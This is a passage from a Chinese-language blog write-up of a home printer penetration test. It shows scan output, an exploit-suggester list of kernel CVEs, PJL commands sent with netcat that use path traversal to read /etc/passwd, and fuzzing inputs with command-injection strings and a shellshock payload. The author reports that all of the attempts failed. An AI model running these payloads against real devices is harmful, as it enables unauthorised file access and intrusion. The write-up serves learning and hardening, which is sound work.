    Running: Linux 2.6.X
    OS CPE: cpe:/o:linux:linux_kernel:2.6
    OS details: Linux 2.6.31 - 2.6.35 (embedded)
    Network Distance: 1 hop
    OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
通过对扫描结果的分析我们发现，该打印机开放了9100端口，并且它正在运行一个较旧的Linux内核，但该打印机并没有开放TCP
22端口，因此想要造成文件系统的混乱是不可能的了。然后，使用PRET看看能获取到什么数据信息，实验结果如下所示：
    $ python pret.py 192.168.1.108 -s PS
    Checking for IPP support:       found
    Checking for HTTP support:      found
    Checking for SNMP support:      found
    Checking for PS support:        not found
    $ python pret.py 192.168.1.108 -s Pjl
    Checking for IPP support:       found
    Checking for HTTP support:      found
    Checking for SNMP support:      found
    Checking for PJL support:       not found
    $ python pret.py 192.168.1.108 -s PCL
    Checking for IPP support:       found
    Checking for HTTP support:      found
    Checking for SNMP support:      found
    Checking for PCL support:       not found
依然没有发现SSH，很可能是这款打印机的供应商对该打印机系统做了一些定制化的操作，使其变得稍微安全一些，不然一旦使用PRET连接到打印机中的一个功能，我们将可以做很多事情。例如检查文件系统。
创建目录，更改配置文件甚至dump整个NVRAM。在发现使用PRET无果之后，我继续尝试其他渗透测试工具！我准备使用LES工具，以发现是否存在可以利用的Linux漏洞，实验过程如下所示：
    $ perl Linux_Exploit_Suggester.pl -k 2.6.31
    Kernel local: 2.6.31
    Searching among 65 exploits...
    Possible Exploits:
    [+] american-sign-language
       CVE-2010-4347
       Source: http://www.securityfocus.com/bid/45408/
    [+] can_bcm
       CVE-2010-2959
       Source: http://www.exploit-db.com/exploits/14814/
    [+] do_pages_move
       Alt: sieve    CVE-2010-0415
       Source: Spenders Enlightenment
    [+] half_nelson
       Alt: econet    CVE-2010-3848
       Source: http://www.exploit-db.com/exploits/6851
    [+] half_nelson1
       Alt: econet    CVE-2010-3848
       Source: http://www.exploit-db.com/exploits/17787/
    [+] half_nelson2
       Alt: econet    CVE-2010-3850
       Source: http://www.exploit-db.com/exploits/17787/
    [+] half_nelson3
       Alt: econet    CVE-2010-4073
       Source: http://www.exploit-db.com/exploits/17787/
    [+] msr
       CVE-2013-0268
       Source: http://www.exploit-db.com/exploits/27297/
    [+] pipe.c_32bit
       CVE-2009-3547
       Source: http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c
    [+] pktcdvd
       CVE-2010-3437
       Source: http://www.exploit-db.com/exploits/15150/
    [+] ptrace_kmod2
       Alt: ia32syscall,robert_you_suck    CVE-2010-3301
       Source: http://www.exploit-db.com/exploits/15023/
    [+] rawmodePTY
       CVE-2014-0196
       Source: http://packetstormsecurity.com/files/download/126603/cve-2014-0196-md.c
    [+] rds
       CVE-2010-3904
       Source: http://www.exploit-db.com/exploits/15285/
    [+] reiserfs
       CVE-2010-1146
       Source: http://www.exploit-db.com/exploits/12130/
    [+] video4linux
       CVE-2010-3081
       Source: http://www.exploit-db.com/exploits/15024/
通过简单地分析LES工具的输出结果，我决定继续尝试其他方法。
直觉告诉我，为什么不再试试PJL呢？因此我使用netcat作为监听程序，并尝试手动调用一些命令，执行命令如下所示：
    echo "@PJL FSUPLOAD FORMAT:BINARY NAME="../../etc/passwd" OFFSET=0 SIZE=648" | nc -v -v 192.168.1.108 9100
    # If successful this should display the */etc/passwd* file.
或者
    echo "@PJL INFO ID" | nc -v -v 192.168.1.108 9100
    # If successful this should get the *printer’s device information*
在这个过程中我也尝试了其他PJL命令注入技术，由于它们的命令语法差异很大，加上我也不太了解PS/PCL的启动，因此我的打印机对这种“攻击”一点也没有反应。
**一个PRET脚本就能搞定？**
****
如上所述，PRET并不能用来“攻击”我的家用打印机。但是我发现PRET源文件夹中有一个名为“lpdtest.py”的“隐藏”脚本，该脚本可以用来测试行式打印机后台程序中较老的漏洞，测试过程如下所示：
尝试从打印机的文件系统获取文件，代码如下所示：
    $ lpdtest.py printer get / etc / passwd
    $ lpdtest.py printer get ../../../etc/passwd
    ＃etc...
此测试对用户输入的数据（例如主机名，用户名，作业名，文件名等）进行fuzz处理。
    # Test for environment variables
    $ lpdtest.py printer in '$UID'
    # Test for pipes and redirects
    $ lpdtest.py printer in '| pwd'
    $ lpdtest.py printer in '>> /etc/passwd'
    # Test for backticks
    $ lpdtest.py printer in '`ls`'
    # Test for [shellshock (CVE-2014-6271)](http://seclists.org/oss-sec/2014/q3/650)
    $ lpdtest.py printer in '() {:;}; /bin/ping -c1 1.2.3.4'
正如预期的那样，这些攻击已经被修复，使用该脚本依然没能成功实施对打印机的攻击操作。
**总结**
****
为什么打印机会被攻击？
大多数打印机已经和个人电脑或者服务器没什么区别了！
打印机可用作端口/网络/漏洞利用扫描器
用于计算/哈希破解/嗅探
用于上传恶意软件
用作C&C服务器
盗取未加密的数据
**展望**
****
如果我拿到一些更好的打印机，那么我将会继续在这些打印机上研究有关打印机漏洞利用的实验。如果我有更多的时间，我会投入更多的时间去研究对上述家用打印机的漏洞利用。例如捕获固件更新，并尝试对固件执行脱壳和逆向操作，但这些都需要投入更多的时间去研究和分析。所以我现在保持开放的心态，我希望上述的研究和分析能让我保持对打印机漏洞利用研究的兴趣。此外，我希望这篇文章能够帮助到那些对打印机漏洞利用感兴趣的人，并能够学习一些东西。所以如果你想研究自己的打印机设备，Just
do it!不过请切记提醒：
找到进入系统的一种方式，
检查使用的打印机语言，并尝试上述这些代码注入技术，
尝试从Web界面dump文件系统目录结构，
如果可以，上传自己创建的“恶意”固件，
找到一种新的漏洞利用方法
最后，我期待着反馈和改进建议。